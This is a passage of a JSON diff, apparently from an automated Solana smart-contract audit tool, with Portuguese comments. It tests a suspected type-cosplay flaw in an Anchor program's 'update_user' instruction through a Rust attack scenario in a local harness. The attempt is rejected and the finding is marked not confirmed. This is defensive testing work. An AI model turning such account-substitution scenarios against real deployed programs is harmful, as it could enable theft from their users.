+      "raw": "{\"plan\": \"O baseline usa uma conta `user` com 32 bytes de dados (campo authority) pertencente ao programa, e a autoridade assina. O ataque substitui a conta `user` por uma conta com os mesmos 32 bytes, mas cujos 8 primeiros bytes (discriminador) diferem dos do baseline, simulando dados de `Metadata` interpretados como `User`. Como o programa nao verifica discriminador, a desserializacao como `User` deve ter sucesso e a comparacao de autoridade sera feita contra o valor controlado; o efeito medido e que a instrucao aceita a conta de outro tipo.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet user_legit = Pubkey::new_unique();\\nlet user_meta = Pubkey::new_unique();\\n\\n// Conta legítima: 32 bytes do campo authority (sem discriminador, pois o programa usa try_from_slice)\\nlet user_data_legit = authority.bytes();\\nlet user_account_legit = account(&env.program_id, &user_data_legit, None);\\n\\n// Conta maliciosa: 32 bytes, mas com os 8 primeiros bytes diferentes (discriminador de Metadata)\\nlet mut meta_data = authority.bytes();\\nmeta_data[0] = meta_data[0].wrapping_add(1);\\nlet user_account_meta = account(&env.program_id, &meta_data, None);\\n\\nlet authority_account = wallet(1_000_000_000);\\n\\n// Baseline: uso legítimo com User\\nlet ix_baseline = env.anchor_ix(\\\"update_user\\\", &(), vec![\\n    AccountMeta::new_readonly(user_legit, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet contas_baseline = vec![\\n    (user_legit, user_account_legit),\\n    (authority, authority_account.clone()),\\n];\\nlet r_baseline = env.baseline(\\\"update_user com User legítimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: substitui user por conta com discriminador diferente (dados de Metadata)\\nlet ix_attack = env.anchor_ix(\\\"update_user\\\", &(), vec![\\n    AccountMeta::new_readonly(user_meta, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet contas_attack = vec![\\n    (user_meta, user_account_meta),\\n    (authority, authority_account),\\n];\\nlet r_attack = env.attack(\\\"update_user com Metadata no lugar de User\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    env.effect(\\\"instrução aceitou conta de tipo Metadata como User\\\", true);\\n}\\n\"}",
+      "plan": "O baseline usa uma conta `user` com 32 bytes de dados (campo authority) pertencente ao programa, e a autoridade assina. O ataque substitui a conta `user` por uma conta com os mesmos 32 bytes, mas cujos 8 primeiros bytes (discriminador) diferem dos do baseline, simulando dados de `Metadata` interpretados como `User`. Como o programa nao verifica discriminador, a desserializacao como `User` deve ter sucesso e a comparacao de autoridade sera feita contra o valor controlado; o efeito medido e que a instrucao aceita a conta de outro tipo.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet user_legit = Pubkey::new_unique();\nlet user_meta = Pubkey::new_unique();\n\n// Conta legítima: 32 bytes do campo authority (sem discriminador, pois o programa usa try_from_slice)\nlet user_data_legit = authority.bytes();\nlet user_account_legit = account(&env.program_id, &user_data_legit, None);\n\n// Conta maliciosa: 32 bytes, mas com os 8 primeiros bytes diferentes (discriminador de Metadata)\nlet mut meta_data = authority.bytes();\nmeta_data[0] = meta_data[0].wrapping_add(1);\nlet user_account_meta = account(&env.program_id, &meta_data, None);\n\nlet authority_account = wallet(1_000_000_000);\n\n// Baseline: uso legítimo com User\nlet ix_baseline = env.anchor_ix(\"update_user\", &(), vec![\n    AccountMeta::new_readonly(user_legit, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet contas_baseline = vec![\n    (user_legit, user_account_legit),\n    (authority, authority_account.clone()),\n];\nlet r_baseline = env.baseline(\"update_user com User legítimo\", &ix_baseline, &contas_baseline);\n\n// Ataque: substitui user por conta com discriminador diferente (dados de Metadata)\nlet ix_attack = env.anchor_ix(\"update_user\", &(), vec![\n    AccountMeta::new_readonly(user_meta, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet contas_attack = vec![\n    (user_meta, user_account_meta),\n    (authority, authority_account),\n];\nlet r_attack = env.attack(\"update_user com Metadata no lugar de User\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    env.effect(\"instrução aceitou conta de tipo Metadata como User\", true);\n}\n",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "update_user com User legítimo",
+            "result": "Success",
+            "compute_units": 7958,
+            "account_flags": "-r,sr",
+            "ix_head": "0902a0a9760ccf54",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0000000000000002",
+                "digest": "1af94aa75bdb9b97",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_user com Metadata no lugar de User",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 1966,
+            "account_flags": "-r,sr",
+            "ix_head": "0902a0a9760ccf54",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 32,
+                "head": "0100000000000002",
+                "digest": "25ff11647117ce3d",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 7958 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1966 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "not_confirmed",
+      "reason": "baseline ok; ataque rejeitado: Failure(InvalidAccountData)"
+    }
+  ],
+  "case_id": "SL-03-INS",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let user = User::try_from_slice(&ctx.accounts.user.data.borrow()).unwrap();\n...\n#[derive(AnchorSerialize, AnchorDeserialize)]\npub struct User {\n    authority: Pubkey,\n}\n\n#[derive(AnchorSerialize, AnchorDeserialize)]\npub struct Metadata {\n    account: Pubkey,\n}",
+    "explanation": "A conta `user` e desserializada manualmente a partir de `AccountInfo` sem verificar um discriminador de tipo. O programa define duas structs (`User` e `Metadata`) com o mesmo layout de 32 bytes. Como nao ha verificacao de discriminador, uma conta contendo dados de `Metadata` pode ser interpretada como `User`, permitindo que o campo `authority` seja lido a partir de dados de outro tipo. A checagem de owner posterior mitiga parcialmente, mas a ausencia de discriminador e um sinal de type cosplay.",
+    "attack_hypothesis": "Um atacante forneceria uma conta `user` que na verdade contem dados de `Metadata` (ou qualquer conta com 32 bytes de dados) para que a desserializacao como `User` seja bem-sucedida e a comparacao de autoridade seja feita contra um valor controlado, embora a checagem de owner subsequente possa rejeitar a transacao se a conta nao pertencer ao programa."
+  }
+}
